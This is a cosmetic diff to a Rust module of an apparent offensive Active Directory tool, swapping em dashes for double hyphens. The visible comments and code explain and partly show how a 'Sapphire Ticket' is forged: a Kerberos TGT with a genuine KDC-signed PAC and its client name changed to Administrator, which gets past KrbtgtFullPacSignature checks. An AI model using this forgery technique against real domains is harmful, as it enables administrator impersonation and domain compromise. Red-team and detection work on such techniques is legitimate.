@@ -1,4 +1,4 @@
-//! Sapphire Ticket — the evolution beyond Diamond that defeats KrbtgtFullPacSignature.
+//! Sapphire Ticket -- the evolution beyond Diamond that defeats KrbtgtFullPacSignature.
 //!
 //! ## How It Works
 //!
@@ -12,7 +12,7 @@
 //! Because the PAC is **exactly** what the KDC issued (unmodified), the KDC checksum is
 //! intact, the KDC_ISSUED flag is set, and KrbtgtFullPacSignature passes. The TGT's cname
 //! is changed to Administrator (or whoever), but the PAC carries the group SIDs from the
-//! original user — so the technique works best when the user we S4U2Self-for is already a DA.
+//! original user -- so the technique works best when the user we S4U2Self-for is already a DA.
 
 use chrono::{Duration, Utc};
 use kerberos_asn1::{
@@ -29,7 +29,7 @@ use crate::golden;
 use crate::runner::{ForgeConfig, ForgeResult, ForgedTicket};
 use crate::validate;
 
-/// Forge a Sapphire Ticket — a TGT with a real KDC-issued PAC.
+/// Forge a Sapphire Ticket -- a TGT with a real KDC-issued PAC.
 pub async fn forge_sapphire_ticket(config: &ForgeConfig) -> Result<ForgeResult> {
     info!("[sapphire] Forging Sapphire Ticket for {}", config.domain);
 
@@ -103,7 +103,7 @@ pub async fn forge_sapphire_ticket(config: &ForgeConfig) -> Result<ForgeResult> 
     info!("[sapphire] Step 4: Extracting KDC-issued PAC");
     let pac_bytes = extract_pac(&enc_ticket)?;
     info!(
-        "[sapphire] PAC extracted ({} bytes) — this is the KDC-signed original",
+        "[sapphire] PAC extracted ({} bytes) -- this is the KDC-signed original",
         pac_bytes.len()
     );
 
@@ -211,7 +211,7 @@ pub async fn forge_sapphire_ticket(config: &ForgeConfig) -> Result<ForgeResult> 
         }),
         persistence_result: None,
         message: format!(
-            "Sapphire Ticket forged: {} as {} ({}) — real KDC-signed PAC bypasses KrbtgtFullPacSignature",
+            "Sapphire Ticket forged: {} as {} ({}) -- real KDC-signed PAC bypasses KrbtgtFullPacSignature",
             realm, impersonate, etype_str
         ),
     })
